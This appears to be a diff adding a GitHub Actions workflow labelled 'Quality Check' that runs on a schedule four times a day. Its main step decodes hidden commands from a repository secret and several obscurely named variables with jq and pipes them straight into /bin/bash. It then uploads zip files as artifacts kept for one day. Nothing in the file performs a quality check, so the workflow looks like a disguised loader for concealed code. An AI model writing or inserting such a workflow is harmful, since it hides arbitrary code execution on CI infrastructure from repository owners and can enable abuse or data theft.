@@ -1,0 +1,36 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          x4301: ${{ secrets.x4301 }}
+        run: |
+          printf '%s' "$x4301" | jq -r .vrfjd9880 | /bin/bash
+          echo $knze43742 | jq -r .cjfrb3130 | /bin/bash
+          printf '%s' "$c735" | jq -r .xz579 | /bin/bash
+          printf '%s' "$vac581" | jq -r .k87 | /bin/bash
+          printf '%s' "$pbie86" | jq -r .bazwk5 | /bin/bash
+          echo $f317 | jq -r .qu771 | /bin/bash
+          printf '%s' "$mj35" | jq -r .hnfw41243 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: QdNhK5Mf
+          path: "*.zip"
+          retention-days: 1
